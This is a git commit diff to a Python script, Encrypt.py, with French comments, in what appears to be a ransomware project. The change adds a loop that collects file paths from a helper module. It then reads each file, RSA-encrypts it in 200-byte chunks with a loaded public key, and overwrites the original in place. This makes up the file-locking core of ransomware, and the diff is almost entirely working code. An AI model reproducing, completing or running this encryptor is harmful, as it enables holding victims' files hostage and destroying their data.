fbf80071add953bd44eed8906254da3d61339c60
Clement <48801402+Clement17-rouault@users.noreply.github.com>
2022-07-13 22:12:56 +0200

    Update Encrypt.py

--- Encrypt.py
+++ Encrypt.py
@@ -2,14 +2,20 @@ import os
 from Crypto.PublicKey import RSA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
+import Interistinf_Files2
 
 #Génération des clefs privé / public
 global key
 global public_key
 
-content_file = open("/encrypt/public.key", 'rb')
-public_key = content_file.read()
-content_file.close
+#IL faudra remplacer la ligne 18 le open par open(save_path,'rb)
+"""
+path = os.environ["appdata"]
+directory = "projet"
+save_path = os.path.join(path, directory)
+"""
+
+
 
 
 def rsa_encrypt(data_to_encrypt):
@@ -19,37 +25,49 @@ def rsa_encrypt(data_to_encrypt):
 
     return(encrypted_text)
 
+def encrypt():
+    path_file = Interistinf_Files2.main()
+    for file in path_file:
+        print(file)
+        file_ = open(file, "rb")
+        byte = file_.read()
+        #encrypted_file = rsa_encrypt(byte)
+        len_encrypted_file = size_of_file = os.path.getsize(file)
+        file_.close()
+        div_RSA_table =[]
+        unit_RSA = 0
+        print(len_encrypted_file)
 
-path_file = "test_excel.xlsx"
-file = open(path_file, "rb")
-byte = file.read()
-#encrypted_file = rsa_encrypt(byte)
-len_encrypted_file = size_of_file = os.path.getsize(path_file)
-file.close()
-div_RSA_table =[]
-unit_RSA = 0
-print(len_encrypted_file)
+        if len_encrypted_file > 200 :
+            range_pourc = int(len_encrypted_file / 200) + (len_encrypted_file % 200 > 0)
+            print(range_pourc)
+            for i in range(range_pourc):
+                if unit_RSA+200 > len_encrypted_file:
+                    diffe = len_encrypted_file-(range_pourc*200) + 200
+                    div_RSA_table.append(byte[unit_RSA:unit_RSA+diffe])
+                else:
+                    div_RSA_table.append(byte[0+unit_RSA:unit_RSA+200])
+                    unit_RSA += 200
+        else :
+            div_RSA_table.append(byte[unit_RSA:len_encrypted_file])
+            range_pourc = 1
+            
+        encrypted_part = []
+        for i in range(range_pourc):
+            encrypted_part.append(rsa_encrypt(div_RSA_table[i]))
 
-if len_encrypted_file > 200 :
-    range_pourc = int(len_encrypted_file / 200) + (len_encrypted_file % 200 > 0)
-    print(range_pourc)
-    for i in range(range_pourc):
-        if unit_RSA+200 > len_encrypted_file:
-            diffe = len_encrypted_file-(range_pourc*200) + 200
-            div_RSA_table.append(byte[unit_RSA:unit_RSA+diffe])
-        else:
-            div_RSA_table.append(byte[0+unit_RSA:unit_RSA+200])
-            unit_RSA += 200
-else :
-    div_RSA_table.append(byte[unit_RSA:len_encrypted_file])
-    range_pourc = 1
-    
-encrypted_part = []
-for i in range(range_pourc):
-    encrypted_part.append(rsa_encrypt(div_RSA_table[i]))
+        encrypted_part2 = b''.join(encrypted_part)
+        file_ = open(file, "wb")
+        file_.write(encrypted_part2)
+        file_.close
+        print("closed")
+    return True
 
-encrypted_part2 = b''.join(encrypted_part)
-file = open(path_file, "wb")
-file.write(encrypted_part2)
-file.close
-print("closed")
+def main():
+    global public_key
+    content_file = open("encrypt/public.key", 'rb')
+    public_key = content_file.read()
+    content_file.close
+    encrypt()
+
+main()
